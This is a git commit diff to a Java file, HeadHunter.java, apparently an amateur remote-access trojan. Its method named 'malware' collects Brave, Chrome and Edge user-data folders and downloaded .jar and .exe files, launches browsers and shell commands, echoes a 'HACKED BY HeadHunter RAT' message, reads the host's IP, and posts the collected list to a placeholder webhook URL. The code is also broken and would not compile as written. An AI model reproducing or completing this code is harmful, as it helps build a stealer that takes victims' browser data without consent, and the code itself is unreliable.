faefea2d3efc612b6f90ae8d6e08f86df2e46f8d
FERDdeveloper <86313430+ferderplays@users.noreply.github.com>
2022-01-01 00:51:52 +0100

    fixxed some problems

--- HeadHunter.java
+++ HeadHunter.java
@@ -19,45 +19,47 @@ public class HeadHunter {
     void malware(String url) {
         char filename;
         ArrayList<String> files = new ArrayList<String>();
-        String brave_data = (System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data");
-        String chrome_data = (System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data");
-        String edge_data = (System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data");
-        String jarfile = (System.getenv("DOWNLOADS") + filename + ".jar");
-        String exefile = (System.getenv("DOWNLOADS") + filename + ".exe");
+        String brave_data = System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data";
+        String chrome_data = System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data";
+        String edge_data = System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data";
+        String jarfile = System.getenv("DOWNLOADS") + filename + ".jar";
+        String exefile = System.getenv("DOWNLOADS") + filename + ".exe";
         files.add(brave_data);
         files.add(chrome_data);
         files.add(edge_data);
         files.add(jarfile);
         files.add(exefile);
-        if (files.add(brave_data) ||
-                files.add(chrome_data) || files.add(edge_data)
-                || files.add(jarfile) || files.add(exefile)) {
-            try {
-                HttpURLConnection webhook = (HttpURLConnection) new URL("webhook here").openConnection();
-                try {
-                    webhook.getOutputStream().write(files.get(exefile));
-                } catch (IOException e2) {
-                }
-            } catch (IOException e1) {
-                e1.printStackTrace();
-            }
-            try {
+        for (String m : files) {
+        	try {
                 Runtime.getRuntime().exec("Chrome.exe");
                 Runtime.getRuntime().exec("Brave Browser.exe");
-                Runtime.getRuntime().exec("cmd.exe /c echo HACKED BY HeadHunter RAT!");
+                Runtime.getRuntime().exec("cmd.exe /c tree");
+                Runtime.getRuntime().exec("cmd.exe /c echo U WERE HACKED BY HeadHunter RAYT!");
             } catch (IOException e) {
                 e.printStackTrace();
             }
             try {
-                InetAddress.getLocalHost().getHostAddress();
+            	String ip = InetAddress.getLocalHost().getHostAddress();
             } catch (UnknownHostException e) {
-                e.printStackTrace();
+            	e.printStackTrace();
             }
         }
-
+        this.send(files);
     }
 
-    public void send(File file, URL url) {
+    public void send(ArrayList<String> files) {
+    	for (String m1 : files) {
+    		try {
+        		HttpURLConnection webhook = (HttpURLConnection) new URL("webhook here").openConnection();
+        		try {
+        			webhook.getOutputStream().write(Arrays.asList(files));
+        		} catch (IOException e2) {
+        			e2.printStackTrace();
+        		}
+            } catch (IOException e1) {
+            	e1.printStackTrace();
+            }
+    	}
     }
 
 }
